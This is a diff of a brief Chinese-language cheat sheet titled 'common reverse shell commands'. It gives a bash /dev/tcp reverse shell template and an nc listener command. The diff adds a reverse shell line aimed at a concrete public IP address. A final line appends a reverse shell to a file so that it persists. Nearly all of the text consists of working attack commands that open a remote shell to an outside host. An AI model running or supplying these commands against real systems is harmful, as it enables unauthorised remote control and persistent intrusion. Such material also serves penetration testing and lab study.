@@ -1,7 +1,7 @@
 反弹shell常用命令：
 /bin/bash -i >& /dev/tcp/<自己主机ip>/<监听端口> 0>&1
 nc -lvnp <监听端口>
-
+bash -c "bash -i >& /dev/tcp/47.122.112.144/1234 0>&1"
 echo "bash -c 'bash -i >& /dev/tcp/10.10.10.128/444 0>&1'" >> 文件名
 将反弹shell写入指定文件中
 
